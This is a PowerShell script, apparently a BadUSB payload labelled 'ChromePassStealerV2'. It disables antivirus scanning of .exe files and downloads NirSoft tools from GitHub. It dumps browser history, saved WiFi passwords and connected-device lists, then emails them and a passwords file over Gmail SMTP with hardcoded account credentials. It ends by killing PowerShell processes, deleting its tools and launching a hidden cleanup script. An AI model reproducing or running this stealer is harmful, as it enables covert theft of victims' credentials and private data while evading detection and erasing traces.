Set-Location C:\Users\Public #Go to the folder in which we will donwload files
Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
Invoke-WebRequest https://github.com/mustafa786ataul/BADUSB/blob/main/fin.ps1 -OutFile fin.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
Invoke-WebRequest https://github.com/mustafa786ataul/BADUSB/tree/main/exefiles/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
Invoke-WebRequest https://github.com/mustafa786ataul/BADUSB/tree/main/exefiles/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
Invoke-WebRequest https://github.com/mustafa786ataul/BADUSB/tree/main/exefiles/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt #Create the file for Browser history
.\WirelessKeyView.exe /stext wifi.txt #Create the file for WiFi passwords
.\WNetWatcher.exe /stext connected_devices.txt #Create the file for connected devices
Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
#Set mail option
$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('make.devand2020@gmail.com', 'Independent*12') #Email with which you want to send information
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'make.devand2020@gmail.com' #Email in which you want to receice the information
$ReportEmail.To.Add('ataulm786@gmail.com') #Email in which you want to receive the information
$ReportEmail.Subject = 'ChromePassStealerV2'
$ReportEmail.Body = 'Attached is your list of informations.'
$ReportEmail.Attachments.Add('C:\Users\Public\Documents\passwords.txt')
$ReportEmail.Attachments.Add('C:\Users\Public\Documents\history.txt')
$ReportEmail.Attachments.Add('C:\Users\Public\Documents\wifi.txt')
$ReportEmail.Attachments.Add('C:\Users\Public\Documents\connected_devices.txt')
$SMTPInfo.Send($ReportEmail) #Send mail
Start-Sleep -Seconds 15 #Wait 15 seconds
Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
Start-Sleep -Seconds 30 #Wait 30 seconds
#Delete nirsoft tools and .ps1 file
Remove-Item BrowsingHistoryView.exe
Remove-Item WNetWatcher.exe
Remove-Item WNetWatcher.cfg
Remove-Item WirelessKeyView.exe
Remove-Item callprog.ps1
Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
powershell.exe -noexit -windowstyle hidden -file fin.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
exit #End .ps1 file
